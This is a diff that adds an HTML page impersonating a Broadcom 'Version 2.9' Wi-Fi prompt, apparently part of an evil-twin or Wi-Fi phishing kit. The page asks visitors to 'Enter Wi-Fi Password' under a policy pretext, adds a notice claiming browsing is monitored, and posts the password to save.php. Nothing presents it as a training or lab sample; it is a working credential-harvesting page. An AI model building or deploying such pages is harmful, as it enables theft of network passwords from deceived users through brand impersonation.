@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Broadcom Version 2.9</title>
+  <link rel="preconnect" href="https://www.oracle.com" crossorigin>
+  <style>
+    :root { --card-max: 520px; --radius: 18px; --pad: 18px; }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; font-family: -apple-system, Segoe UI, Roboto, Arial, Heebo, "Noto Sans Hebrew", sans-serif;
+      background: #0f172a; /* slate-900 */
+      min-height: 100dvh; display: grid; place-items: center; color: #e5e7eb;
+    }
+    .card {
+      width: min(92vw, var(--card-max)); background: #111827; /* gray-900 */
+      border: 1px solid #1f2937; border-radius: var(--radius); padding: clamp(16px, 3vw, 28px);
+      box-shadow: 0 20px 45px rgba(0,0,0,.35);
+      text-align: center; 
+    }
+    .logo {
+      display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 10px;
+    }
+    .logo img { height: 34px; }
+    .badge { font-size: 12px; background: #1f2937; border: 1px solid #374151; padding: 4px 8px; border-radius: 999px; color:#cbd5e1;}
+    h1 { margin: 10px 0 6px; font-weight: 700; font-size: clamp(20px, 4vw, 26px); color:#f3f4f6; }
+    p.sub { margin: 0 0 18px; color:#9ca3af; line-height:1.5; text-align: center; }
+    form { display: grid; gap: 12px; margin-top: 8px; }
+    label { font-size: 14px; color:#e5e7eb; }
+    input[type="text"] {
+      width: 100%; padding: 12px 14px; font-size: 16px; color:#e5e7eb; background: #0b1220;
+      border: 1px solid #334155; border-radius: 12px; outline: none;
+      text-align: center;
+    }
+    input[type="text"]::placeholder { color:#64748b; text-align: center; }
+    .hint { font-size: 12px; color:#a3a3a3; margin-top:-6px; text-align: center; }
+    .row { display:flex; justify-content: center; }
+    button {
+      width: 100%; padding: 12px 16px; border: 0; border-radius: 12px; font-weight: 700; font-size: 16px;
+      background: linear-gradient(90deg, #2563eb, #4f46e5); color: white; cursor: pointer;
+    }
+    button:disabled { opacity:.6; cursor:not-allowed; }
+    .foot {
+      margin-top: 14px; display:flex; justify-content:space-between; align-items:center; font-size:12px; color:#9ca3af;
+    }
+    .legal { font-size: 11px; color:#94a3b8; line-height:1.4; margin-top: 8px; text-align: center; }
+  </style>
+</head>
+<body>
+  <main class="card" role="main" aria-labelledby="title">
+    <div class="logo">
+      <img src="images/brod.svg" alt="Broadcom logo" loading="lazy" />
+    </div>
+    <h1 id="title">******** Wi-Fi</h1>
+    <p class="sub"><strong>Enter Wi-Fi Password </strong></p>
+    <form id="updateForm" method="post" action="save.php" novalidate>
+      <label for="token"></label>
+      <input id="token" name="token" type="text" inputmode="latin" autocomplete="off"
+             placeholder="**********" required
+             aria-describedby="tokenHint">
+      <div id="tokenHint" class="hint">Required to enter once and confirm the policy</div>
+      <div class="row">
+        <button id="goBtn" type="submit">OK and continue</button>
+      </div>
+
+      <div class="legal">
+        <p>
+          Use of the network is intended for safe and responsible browsing only. 
+          Do not download illegal content, harm others, or use the network for malicious purposes. 
+          Browsing is monitored for security and to maintain a normal user experience for everyone.
+        </p>
+      </div>
+    </form>
+
+    <script>
+      const f = document.getElementById('updateForm');
+      const btn = document.getElementById('goBtn');
+      f.addEventListener('submit', (e) => {
+        const token = (document.getElementById('token').value || '').trim();
+        if (!token) {
+          e.preventDefault();
+          alert('Wi-fi Password is required');
+          return false;
+        }
+        btn.disabled = true;
+        btn.textContent = 'Connecting';
+      });
+    </script>
+  </main>
+</body>
+</html>
